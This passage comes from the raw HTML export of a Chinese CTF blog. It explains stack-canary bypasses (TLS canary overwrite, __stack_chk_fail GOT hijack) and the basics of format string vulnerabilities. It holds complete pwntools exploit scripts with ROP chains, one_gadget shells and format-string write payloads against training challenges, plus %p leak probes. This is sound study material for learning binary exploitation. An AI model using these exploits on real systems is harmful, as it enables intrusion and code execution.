class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">\"*** stack smashing detected ***: \"</span>)</span><br><span class=\"line\">puts = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\">leak(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">'puts'</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.dump(<span class=\"string\">'puts'</span>)</span><br><span class=\"line\">environ = libc_base + libc.dump(<span class=\"string\">'_environ'</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">296</span> + p64(environ)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">\"*** stack smashing detected ***: \"</span>)</span><br><span class=\"line\">environ = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">296</span> + p64(environ<span class=\"number\">-360</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-4-覆盖-TLS-中储存的-Canary-值\"><a href=\"#3-4-覆盖-TLS-中储存的-Canary-值\" class=\"headerlink\" title=\"3.4 覆盖 TLS 中储存的 Canary 值\"></a>3.4 覆盖 TLS 中储存的 Canary 值</h2><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>\n<blockquote>\n<p>线程局部存储（Thread Local Storage）是一种机制，通过该机制分配变量，以便每一个现存的线程都有一个变量实例。<br>它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p>\n<p>glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。<br>在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。<br>从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。<br>从TLS到pthread_create的函数参数传递栈帧的距离小于一页。<br>现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。</p>\n</blockquote>\n<h3 id=\"CTF2018-babystack\"><a href=\"#CTF2018-babystack\" class=\"headerlink\" title=\"*CTF2018 babystack\"></a>*CTF2018 babystack</h3><p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142851478.png\" alt=\"image-20210222142851478\"></p>\n<p>说一下主要逻辑，创建一个新的线程，首先是读入size，然后进行读内容</p>\n<p>简单看一下这里有栈溢出</p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142625810.png\" alt=\"image-20210222142625810\"></p>\n<p>接下来我们就可以利用上面的结论</p>\n<ol>\n<li>栈溢出覆盖返回地址，泄露libc基址</li>\n<li>栈迁移到bss段</li>\n<li>ROP</li>\n</ol>\n<p>先看一下canary</p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222150721776.png\" alt=\"image-20210222150721776\"></p>\n<p>看exp把</p>\n<blockquote>\n<p>不懂为什么/bin/sh本地可以，远程打不通，onegadget可以</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26593</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process('./bs')</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bs\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'./libc-2.271.so'</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c03</span></span><br><span class=\"line\">pop_rsi_r15 = <span class=\"number\">0x400c01</span></span><br><span class=\"line\">read_plt = elf.sym[<span class=\"string\">'read'</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">put_plt = elf.sym[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">buf = <span class=\"number\">0x602f00</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x400955</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload =<span class=\"string\">b'A'</span>*<span class=\"number\">0x1010</span> + p64(buf)+ p64(pop_rdi) + p64(puts_got) + p64(put_plt) + p64(pop_rdi) + p64(<span class=\"number\">0</span>) + p64(pop_rsi_r15) + p64(buf+<span class=\"number\">0x8</span>) + p64(<span class=\"number\">0</span>) + p64(read_plt) + p64(leave_ret)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">\"How many bytes do you want to send?\\n\"</span>)</span><br><span class=\"line\">sl(str(<span class=\"number\">0x2000</span>))</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x2000</span>,<span class=\"string\">'A'</span>)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">puts = uu64(ru(<span class=\"string\">'\\x7f'</span>,<span class=\"literal\">False</span>)[<span class=\"number\">-6</span>:])</span><br><span class=\"line\">leak(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.sym[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\"># sys = libc_base + libc.sym[\"system\"]</span></span><br><span class=\"line\"><span class=\"comment\"># bin_sh = libc_base + (libc.search(\"/bin/sh\")).next()</span></span><br><span class=\"line\"><span class=\"comment\"># libc = LibcSearcher('puts',puts)</span></span><br><span class=\"line\"><span class=\"comment\"># libc_base = puts - libc.dump('puts')</span></span><br><span class=\"line\"><span class=\"comment\"># leak(\"libc_base\",libc_base)</span></span><br><span class=\"line\"><span class=\"comment\"># sys = libc_base + libc.dump('system')</span></span><br><span class=\"line\"><span class=\"comment\"># bin_sh = libc_base + libc.dump('str_bin_sh')</span></span><br><span class=\"line\"><span class=\"comment\">#payload = p64(pop_rdi) + p64(bin_sh) + p64(sys)</span></span><br><span class=\"line\">payload = p64(libc_base+<span class=\"number\">0x4f322</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-5-劫持-stack-chk-fail函数\"><a href=\"#3-5-劫持-stack-chk-fail函数\" class=\"headerlink\" title=\"3.5 劫持__stack_chk_fail函数\"></a>3.5 劫持__stack_chk_fail函数</h2><p>改写__stack_chk_fail@got，但前提是必须有一个可以向任意地址写的漏洞，例如说格式化字符串漏洞<br>这个方法适用于只能输入一次的程序，如果说可以利用多次的话就可以直接泄露canary了</p>\n<h3 id=\"BJDCTF-2nd-r2t4\"><a href=\"#BJDCTF-2nd-r2t4\" class=\"headerlink\" title=\"[BJDCTF 2nd]r2t4\"></a>[BJDCTF 2nd]r2t4</h3><p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222203954917.png\" alt=\"image-20210222203954917\"></p>\n<p>基本思路</p>\n<ol>\n<li>劫持got表去backdoor</li>\n</ol>\n<blockquote>\n<p>pwntools自动生成fmt是要看64位还是32位</p>\n<p>所以需要改架构</p>\n</blockquote>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./r2t4\"</span>)</span><br><span class=\"line\">context.arch = elf.arch</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25608</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process('./r2t4')</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__stack_chk_fail = elf.got[<span class=\"string\">'__stack_chk_fail'</span>]</span><br><span class=\"line\">backdoor = elf.sym[<span class=\"string\">'backdoor'</span>]</span><br><span class=\"line\">print(hex(backdoor))</span><br><span class=\"line\"><span class=\"comment\">#payload = b\"%64c%9$hn%1510c%10$hnAAA\" + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)</span></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">6</span>,&#123;__stack_chk_fail:backdoor&#125;)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x38</span>,<span class=\"string\">'A'</span>)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"格式化字符串漏洞","url":"https://pz1o.top/2021/02/15/格式化字符串漏洞/","content":"<p>总结一下格式化字符串漏洞</p>\n<h1 id=\"0x01-格式化输出函数\"><a href=\"#0x01-格式化输出函数\" class=\"headerlink\" title=\"0x01 格式化输出函数\"></a>0x01 格式化输出函数</h1><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int prinf(const char *format,...);</span><br><span class=\"line\">int fprintf(FILE *stream, const char *format,...);</span><br><span class=\"line\">int dprintf(int fd,const char *format,...);</span><br><span class=\"line\">int sprintf(char *str,const char *format,...);</span><br><span class=\"line\">int snprintf(char *str, size_t size, const char *format,...);</span><br></pre></td></tr></table></figure>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">注释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">printf</td>\n<td style=\"text-align:center\">输出到stdout</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fprintf</td>\n<td style=\"text-align:center\">输出到指定FILE流</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vprintf</td>\n<td style=\"text-align:center\">根据参数列表格式化输出到 stdout</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vfprintf</td>\n<td style=\"text-align:center\">根据参数列表格式化输出到指定 FILE 流</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">sprintf</td>\n<td style=\"text-align:center\">输出到字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">snprintf</td>\n<td style=\"text-align:center\">输出指定字节数到字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vsprintf</td>\n<td style=\"text-align:center\">根据参数列表格式化输出到字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vsnprintf</td>\n<td style=\"text-align:center\">根据参数列表格式化输出指定字节到字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">setproctitle</td>\n<td style=\"text-align:center\">设置 argv</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">syslog</td>\n<td style=\"text-align:center\">输出日志</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">err, verr, warn, vwarn 等</td>\n<td style=\"text-align:center\">…</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p><strong>格式化字符串的基本格式</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>\n<ul>\n<li>parameter<ul>\n<li>n$，获取格式化字符串中的指定参数</li>\n</ul>\n</li>\n<li>field width<ul>\n<li>输出的最小宽度</li>\n</ul>\n</li>\n<li>precision<ul>\n<li>输出的最大长度</li>\n</ul>\n</li>\n<li>length，输出的长度<ul>\n<li>hh，输出一个字节</li>\n<li>h，输出一个双字节</li>\n</ul>\n</li>\n<li>type<ul>\n<li>d/i，有符号整数</li>\n<li>u，无符号整数</li>\n<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>\n<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>\n<li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>\n<li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>\n<li>%， ‘%’字面值，不接受任何 flags, width。</li>\n</ul>\n</li>\n</ul>\n<p>举几个例子</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%12c\"</span>,<span class=\"string\">'A'</span>);   <span class=\"comment\">//\"           A\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> n;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%12c%n\"</span>,<span class=\"string\">'A'</span>,&amp;n); <span class=\"comment\">// n = 12;</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%16s%n\"</span>,<span class=\"string\">\"hello\"</span>,&amp;n); <span class=\"comment\">//n = 16</span></span><br><span class=\"line\"><span class=\"comment\">//           hello</span></span><br><span class=\"line\"><span class=\"comment\">//16</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%2$s %1$s\"</span>,<span class=\"string\">\"Format\"</span>,<span class=\"string\">\"Strings\"</span>);  </span><br><span class=\"line\"><span class=\"comment\">//Strings Format</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%42c%1$n\"</span>,&amp;n); </span><br><span class=\"line\"><span class=\"comment\">//                                         �</span></span><br><span class=\"line\"><span class=\"number\">42</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"0x02-格式化字符串漏洞\"><a href=\"#0x02-格式化字符串漏洞\" class=\"headerlink\" title=\"0x02 格式化字符串漏洞\"></a>0x02 格式化字符串漏洞</h1><h2 id=\"1-基本原理\"><a href=\"#1-基本原理\" class=\"headerlink\" title=\"1.基本原理\"></a>1.基本原理</h2><p>先看一个例子</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">printf(&quot;%s %d %s %x %x %x %3$s&quot;,&quot;hello&quot;,123,&quot;x&quot;);</span><br><span class=\"line\">&#x2F;&#x2F;hello 123 x f7fb43dc ffffcfc0 0 x</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里我们可以看到是有7个参数输出，但我们只有3个参数，原因是什么？</p>\n</blockquote>\n<p>可以gdb调试一下</p>\n<p><img src=\"/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210216115800043.png\" alt=\"image-20210216115800043\"></p>\n<p>我们可以看到输出的是图中红框的数</p>\n<p>最后x就是偏移量为3的x</p>\n<p>说明我们对内存已经进行了一定的泄露。</p>\n<p>那么我们如果可以控制格式化字符串，我们就可以进行任意泄露，并通过%n来任意写。</p>\n<h2 id=\"2-漏洞利用\"><a href=\"#2-漏洞利用\" class=\"headerlink\" title=\"2.漏洞利用\"></a>2.漏洞利用</h2><p>格式化字符串主要有：</p>\n<ol>\n<li>栈数据泄露</li>\n<li>任意地址内存泄露</li>\n<li>栈数据覆盖</li>\n<li>任意地址内存覆盖</li>\n<li>程序崩溃</li>\n</ol>\n<p>首先需要说明一下，在32位和64位系统上传参的方式是有区别的:</p>\n<ul>\n<li><p>32位</p>\n<ul>\n<li>参数从右到左依次压入堆栈，每次压入一个。调用者（caller）必须明确有多少Byte的参数，以便函数返回后清理掉。</li>\n</ul>\n</li>\n<li><p>64位</p>\n<ul>\n<li>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。</li>\n<li>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</li>\n</ul>\n</li>\n</ul>\n<p>因为利用的需要，明确出格式化字符串本身在第几个参数是有必要的，在这里可以使用：</p>\n<blockquote>\n<p>AAAA%n$x</p>\n</blockquote>\n<p>意思是以16位打印第n+1个参数的内容，如果n的数值正确应该返回<code>41414141</code>,0x41正是’A’的ASCII值，如果出现了就可以确认。</p>\n<h3 id=\"2-1-程序崩溃\"><a href=\"#2-1-程序崩溃\" class=\"headerlink\" title=\"2.1 程序崩溃\"></a>2.1 程序崩溃</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">printf(&quot;%s%s%s%s%s%s%s%s&quot;)</span><br></pre></td></tr></table></figure>\n<p>上面这种字符串格式会引起崩溃</p>\n<p>原因有3点</p>\n<ol>\n<li>对于每一个<code>%s</code>printf都需要从栈上获取数字，并将其作为地址，打印指向地址的内存，直到出现空字符</li>\n<li>某个数字不是地址</li>\n<li>获取某个数字是地址，但该地址受保护</li>\n</ol>\n<h3 id=\"2-2-栈数据泄露\"><a href=\"#2-2-栈数据泄露\" class=\"headerlink\" title=\"2.2 栈数据泄露\"></a>2.2 栈数据泄露</h3><h4 id=\"栈变量的值\"><a href=\"#栈变量的值\" class=\"headerlink\" title=\"栈变量的值\"></a><strong>栈变量的值</strong></h4><p>因为该家族函数执行环境都在栈上，所以泄露栈上数据是很自然的。除了首先想到的通过类似于<code>%p%p%p%p...</code>这样打印的方法，还有用<code>%n$[format]</code>这样指定栈上第几个参数的方式。</p>\n<h4 id=\"栈上的字符串\"><a href=\"#栈上的字符串\" class=\"headerlink\" title=\"栈上的字符串\"></a><strong>栈上的字符串</strong></h4><p>%n$s来泄露字符串</p>\n<p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃</strong></p>\n<blockquote>\n<ol>\n<li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li>\n<li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li>\n<li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容</li>\n</ol>\n</blockquote>\n<h3 id=\"2-3-任意地址内存泄露\"><a href=\"#2-3-任意地址内存泄露\" class=\"headerlink\" title=\"2.3 任意地址内存泄露\"></a>2.3 任意地址内存泄露</h3><p>我们用这个主要是通过泄露GOT表，从而获得libc基址，达到getshell</p>\n<p>先看一下这个程序</p>\n<figure class=\"highlight cc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;  // strtoull</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;\t</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">128</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%s\"</span>,a);\t</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class=\"line\"><span class=\"comment\">//AAAA.0xffffcf2c.0xf7fd34a0.0x1.(nil).0x1.0xf7ffd918.0x41414141.0x2e70252e.0x252e7025</span></span><br></pre></td></tr></table></figure>\n<p>看一下调试记录</p>\n<p><img src=\"/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210216172241585.png\" alt=\"image-20210216172241585\"></p>\n<blockquote>\n<p>为什么出现这种情况？</p>\n<p>因为我们的a是可控的，所以在栈上一定有a的地址，也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。</p>\n<p>我们所要做的就是找出a的地址</p>\n<p>也就是相对偏移量</p>\n</blockquote>\n<p>利用下面这种格式，我们就可以得到对应地址的字符串</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">addr%k$s</span><br></pre></td></tr></table></figure>\n<p>这里演示一下泄露got表，先看一下重定向表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pz1o@pz1o:~&#x2F;桌面$ readelf -r b</span><br><span class=\"line\"></span><br><span class=\"line\">重定位节 &#39;.rel.dyn&#39; 位于偏移量 0x30c 含有 1 个条目：</span><br><span class=\"line\"> 偏移量     信息    类型              符号值      符号名称</span><br><span class=\"line\">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class=\"line\"></span><br><span 